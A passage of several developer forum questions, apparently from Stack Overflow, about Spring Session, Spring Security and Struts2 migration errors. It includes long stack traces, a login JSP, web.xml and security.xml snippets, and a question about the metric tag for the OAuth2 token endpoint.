    at org.springframework.session.data.mongo.AbstractMongoSessionConverter.convert(AbstractMongoSessionConverter.java:115) ~[spring-session-data-mongodb-3.1.3.jar:3.1.3]
    at org.springframework.session.data.mongo.MongoSessionUtils.convertToSession(MongoSessionUtils.java:45) ~[spring-session-data-mongodb-3.1.3.jar:3.1.3]
    at org.springframework.session.data.mongo.MongoIndexedSessionRepository.findById(MongoIndexedSessionRepository.java:117) ~[spring-session-data-mongodb-3.1.3.jar:3.1.3]
    at org.springframework.session.data.mongo.MongoIndexedSessionRepository.findById(MongoIndexedSessionRepository.java:55) ~[spring-session-data-mongodb-3.1.3.jar:3.1.3]
    at org.springframework.session.web.http.SessionRepositoryFilter$SessionRepositoryRequestWrapper.getRequestedSession(SessionRepositoryFilter.java:351) ~[spring-session-core-3.1.3.jar:3.1.3]
    at org.springframework.session.web.http.SessionRepositoryFilter$SessionRepositoryRequestWrapper.getSession(SessionRepositoryFilter.java:285) ~[spring-session-core-3.1.3.jar:3.1.3]
    at org.springframework.session.web.http.SessionRepositoryFilter$SessionRepositoryRequestWrapper.getSession(SessionRepositoryFilter.java:194) ~[spring-session-core-3.1.3.jar:3.1.3]
    at jakarta.servlet.http.HttpServletRequestWrapper.getSession(HttpServletRequestWrapper.java:221) ~[tomcat-embed-core-10.1.15.jar:6.0]
    at jakarta.servlet.http.HttpServletRequestWrapper.getSession(HttpServletRequestWrapper.java:221) ~[tomcat-embed-core-10.1.15.jar:6.0]
    at com.deaslide.exchange.configuration.security.AuthSessionFilter.doFilterInternal(AuthSessionFilter.java:35) ~[classes/:na]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.0.13.jar:6.0.13]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.springframework.session.web.http.SessionRepositoryFilter.doFilterInternal(SessionRepositoryFilter.java:143) ~[spring-session-core-3.1.3.jar:3.1.3]
    at org.springframework.session.web.http.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:82) ~[spring-session-core-3.1.3.jar:3.1.3]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.0.13.jar:6.0.13]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.0.13.jar:6.0.13]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.13.jar:6.0.13]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:340) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.15.jar:10.1.15]
    at java.base/java.lang.Thread.run(Thread.java:1583) ~[na:na]
</code></pre>
<p>I tried change SessionCreationPolicy to STATELESS and all works, but sessions created for all requests</p>
"
"<p>We are upgrading from Java 8 to Java 17, a set of projects and applications built in IntelliJ utilizing Maven.</p>
<p>We have upgraded all artifacts/dependencies to their most recent releases with the exception of OpenJPA and Spring Frameworks.<br />
There were minimal code changes related to the upgrading of artifacts for a successful compile.</p>
<p>We are using Struts2 – version 6.3.0.2, and OpenJPA, version 2.2.2.  As I understand the OpenJPA and SpringFrameworks relationship we are limited to using Spring Frameworks 4.3.30 as versions 5 and 6 do not support OpenJPA.</p>
<p>Since we are using Spring Frameworks 4.3.30 RELEASE and Spring Security 4.2.20 RELEASE, we are using Javax versus Jakarta.<br />
The Java 8 version of our app uses Spring Frameworks 3.0.5 RELEASE, Spring Security 2.0.4 and Struts2 2.1.8.1.</p>
<p>Attempting to run the webapp locally in Tomcat 8.5 and expecting our logon.jsp page.  But get a 500 error and the exception below.</p>
<pre><code>    java.lang.NullPointerException: Cannot invoke &quot;com.opensymphony.xwork2.ActionInvocation.getProxy()&quot; because &quot;invocation&quot; is null
        at org.apache.struts2.components.Component.getNamespace(Component.java:448)
        at org.apache.struts2.components.Component.determineNamespace(Component.java:433)
        at org.apache.struts2.components.Component.determineActionURL(Component.java:415)
        at org.apache.struts2.components.ComponentUrlProvider.determineActionURL(ComponentUrlProvider.java:66)
        at org.apache.struts2.components.ServletUrlRenderer.renderUrl(ServletUrlRenderer.java:88)
        at org.apache.struts2.components.URL.end(URL.java:142)
        at org.apache.struts2.views.jsp.ComponentTagSupport.doEndTag(ComponentTagSupport.java:40)
        at org.apache.jsp.index_jsp._jspx_meth_s_005furl_005f0(index_jsp.java:166)
        at org.apache.jsp.index_jsp._jspService(index_jsp.java:126)
        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:765)
        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:465)
        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:383)
        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:331)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:765)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.apache.struts2.dispatcher.filter.StrutsExecuteFilter.doFilter(StrutsExecuteFilter.java:113)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:182)
        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:85)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.apache.struts2.dispatcher.filter.StrutsPrepareFilter.doFilter(StrutsPrepareFilter.java:116)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:317)
        at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127)
        at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:114)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.csrf.CsrfFilter.doFilterInternal(CsrfFilter.java:100)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:66)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105)
        at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)
        at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:214)
        at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:177)
        at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:347)
        at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:263)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.springframework.orm.jpa.support.OpenEntityManagerInViewFilter.doFilterInternal(OpenEntityManagerInViewFilter.java:178)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
</code></pre>
<p>We have moved past the above error.  We added the servlet-mapping tag to the web.xml file.  THe servlet tag was already there from JAVA 8 version.</p>
<pre><code>   &lt;servlet&gt;
        &lt;servlet-name&gt;jsp-support-servlet&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.struts2.views.JspSupportServlet&lt;/servlet-class&gt;
        &lt;load-on-startup&gt;2&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
   &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;jsp-support-servlet&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
</code></pre>
<p>Now we get &quot;There is no Action mapped for action name&quot; - 404.  We have used &quot;j_spring_security_check&quot; and &quot;login&quot; (read Spring 4 uses &quot;login&quot;) for the action in the below login.jsp file and get the same error.</p>
<pre><code>&lt;%@ taglib prefix=&quot;hjt&quot; uri=&quot;/hvat-js-tags&quot; %&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Login&lt;/title&gt;

    &lt;hjt:head/&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;pageContent&quot;&gt;

    &lt;div id=&quot;pageHeadingMessage&quot;&gt;
        To proceed, you must login.
    &lt;/div&gt;

    &lt;div id=&quot;pageForm&quot;&gt;
        &lt;form id=&quot;activationForm&quot; action=&quot;login&quot; method=&quot;POST&quot; &gt;
            &lt;table id=&quot;activationFormTable&quot;&gt;
                &lt;tr&gt;
                    &lt;td align=&quot;right&quot;&gt;Username:&lt;/td&gt;
                    &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;j_username&quot;
                                     name=&quot;j_username&quot;/&gt;&lt;/td&gt;
                    &lt;td&gt;&lt;span class=&quot;errorSpan&quot; id=&quot;j_username.errors&quot;&gt; &lt;/span&gt;&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                    &lt;td align=&quot;right&quot;&gt;Password:&lt;/td&gt;
                    &lt;td&gt;&lt;input type=&quot;password&quot; id=&quot;j_password&quot;
                                     name=&quot;j_password&quot; /&gt;&lt;/td&gt;
                    &lt;td&gt;&lt;span class=&quot;errorSpan&quot; id=&quot;j_password.errors&quot;&gt; &lt;/span&gt;&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                    &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
                &lt;/tr&gt;
            &lt;/table&gt;
        &lt;/form&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    var focusElement = document.getElementById('j_username');
    if(focusElement) {
        focusElement.focus();
    }
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Here is our Index.jsp file.  I see that it has an &quot;action&quot; too.  Not sure which action the 404 error is referring too.</p>
<pre><code>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot;%&gt;
&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot;%&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Loading&lt;/title&gt;
    &lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;URL=&lt;s:url action=&quot;index&quot; /&gt;&quot; &gt;
&lt;/head&gt;
&lt;body&gt;
Loading...
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Also including our security.xml file.  If I change the access back to ROLE_USER from ROLE_ANONYMOUS we get ERR_TOO_MANY_REDIRECTS error.</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns:security=&quot;http://www.springframework.org/schema/security&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans
                http://www.springframework.org/schema/beans/spring-beans.xsd
                http://www.springframework.org/schema/security
                http://www.springframework.org/schema/security/spring-security-4.2.xsd&quot;&gt;

    &lt;!-- SECURITY INTERCEPTOR for supporting READ/CHANGE permissions --&gt;
    &lt;bean id=&quot;securityInterceptor&quot; scope=&quot;singleton&quot;
          class=&quot;com.cdotech.security.struts2.SecurityInterceptor&quot;&gt;
        &lt;property name=&quot;securityManager&quot; ref=&quot;appSecurityManager&quot;/&gt;
    &lt;/bean&gt;
    &lt;!-- /SECURITY INTERCEPTOR --&gt;

    &lt;security:http&gt;
        &lt;security:intercept-url pattern=&quot;/login.jsp*&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/index.jsp*&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/user-guide*&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/security/logout*&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/security/ajax/loggedIn*&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/css/**&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/images/**&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/favicon.ico*&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/javascript/**&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/decorators/**&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/static/**&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/struts/**&quot; /&gt;
        &lt;security:intercept-url pattern=&quot;/**&quot; access=&quot;hasRole('ROLE_ANONYMOUS')&quot; /&gt;
        &lt;security:form-login login-page=&quot;/login.jsp&quot;/&gt;
    &lt;/security:http&gt;

    &lt;security:authentication-manager &gt;
        &lt;security:authentication-provider user-service-ref=&quot;userDetailsService&quot;&gt;
            &lt;security:password-encoder hash=&quot;sha&quot; /&gt;
        &lt;/security:authentication-provider&gt;
    &lt;/security:authentication-manager&gt;

&lt;/beans&gt;
</code></pre>
<p>I appreciate all who take the time to look at this.  It is a learning experience.  Especially since I'm a C#, non-web developer for 3 decades.
If you need more info feel free to ask.</p>
"
"<p>I'm using Spring Authorization Server, and didn't notice that <code>http.server.requests</code> metric contains <code>/oauth2/token</code> <code>uri</code> tag.</p>
<p>But I've noticed during debugging of <code>WebMvcMetricsFilter</code> that the metric is actually counted, but the <code>uri</code> tag is <code>root</code>, because <code>HttpServletRequest#getPathInfo</code> returns <code>null</code> for requests on <code>/oauth2/token</code></p>
<p>Why doesn't that work by defualt?</p>
<p>Also didn't notice anything about metrics in docs <a href=""https://docs.spring.io/spring-authorization-server/reference/overview.html"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-authorization-server/reference/overview.html</a></p>
<p>Any idea how to fix <code>uri</code> tag for <code>http.server.requests</code> metric for standard <code>/oauth2/token</code> endpoint?</p>
"
"<p>I am working through the Spring Security 6 migration preparation steps in Spring Security 5.8.9 (<a href=""https://docs.spring.io/spring-security/reference/5.8/migration/index.html"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security/reference/5.8/migration/index.html</a>) and I have run into an odd situation that I am unable to resolve.</p>
<p>When I applied the recommended changes and ran the app it gave the following error:</p>
<pre><code>org.springframework.beans.factory.NoSuchBeanDefinitionException: No bean named 'mvcHandlerMappingIntrospector' available: A Bean named mvcHandlerMappingIntrospector of type org.springframework.web.servlet.handler.HandlerMappingIntrospector is required to use MvcRequestMatcher. Please ensure Spring Security &amp; Spring MVC are configured in a shared ApplicationContext.
</code></pre>
<p>I searched for this issue and found that the documentation recommends configuring Spring Security with Spring MVC by adding the config to the Servlet context and not the application root context. (<a href=""https://docs.spring.io/spring-security/reference/5.8/servlet/integrations/mvc.html#mvc-requestmatcher"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security/reference/5.8/servlet/integrations/mvc.html#mvc-requestmatcher</a>)</p>
<p>So I adjusted my setup to load the security config in the spring servlet context by adding it to the <code>getServletConfigClasses</code> rather than the <code>getRootConfigClasses</code> in my WebServletInitializer.</p>
<p>But now it doesn't load at all and I get the following in the log:</p>
<pre><code>22-Feb-2024 16:45:09.963 INFO [main] org.apache.catalina.core.ApplicationContext.log 2 Spring WebApplicationInitializers detected on classpath
22-Feb-2024 16:45:10.028 INFO [main] org.apache.catalina.core.ApplicationContext.log Initializing Spring root WebApplicationContext
22-Feb-2024 16:45:52.348 SEVERE [main] org.apache.catalina.core.StandardContext.filterStart Exception starting filter [springSecurityFilterChain]
        org.springframework.beans.factory.NoSuchBeanDefinitionException: No bean named 'springSecurityFilterChain' available
                at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanDefinition(DefaultListableBeanFactory.java:874)
